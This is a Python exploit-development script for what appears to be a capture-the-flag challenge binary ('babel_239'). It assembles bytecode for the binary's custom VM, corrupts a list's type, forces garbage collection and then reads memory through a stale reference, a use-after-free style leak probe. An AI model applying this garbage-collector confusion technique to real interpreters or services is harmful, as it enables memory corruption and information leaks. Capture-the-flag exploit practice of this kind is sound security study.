import vm, struct, subprocess
BIN = "/mnt/work/buuctf/other/2.39/amd64/babel/lab/babel_239"
def frame(p):
    c = vm.asm(p); return struct.pack('<I', len(c)) + c
prog = []
prog += [('str', b''), ('stl', 1)]                     # S0 at 0x00
prog += [('push', 0), ('push', 0), ('list', 2), ('stl', 0)]   # HL at 0x20
prog += [('ldl', 1), ('push', 0), ('setb', 0)]         # HL type -> 0
# D at 0x50: only referenced from HL[0]
prog += [('ldl', 0), ('push', 0), ('list', 1), ('sete', 0)]
# B at 0x70: only referenced from HL[1]
prog += [('ldl', 0), ('input', 16), ('sete', 1)]
# live: H at 0x90, A at 0xB0
prog += [('hdl', 1), ('stl', 2)]
prog += [('push', 0), ('list', 1), ('stl', 3)]
# print HL elements before GC
prog += [('ldl', 0), ('gete', 0), ('print',), ('pop',)]
prog += [('ldl', 0), ('gete', 1), ('print',), ('pop',)]
# trigger GC
prog += [('str', b'Z' * 0x7ff0), ('pop',)]
# after GC
prog += [('ldl', 2), ('print',), ('pop',)]     # H ref
prog += [('ldl', 3), ('print',), ('pop',)]     # A ref
prog += [('ldl', 0), ('gete', 0), ('print',), ('pop',)]   # HL[0]
prog += [('ldl', 0), ('gete', 1), ('print',), ('pop',)]   # HL[1]
prog += [('ldl', 0), ('gete', 0), ('gete', 0), ('print',)]  # leak through stale ref
p = subprocess.run([BIN], input=frame(prog), stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=60)
print(p.returncode, p.stdout, p.stderr[:150])
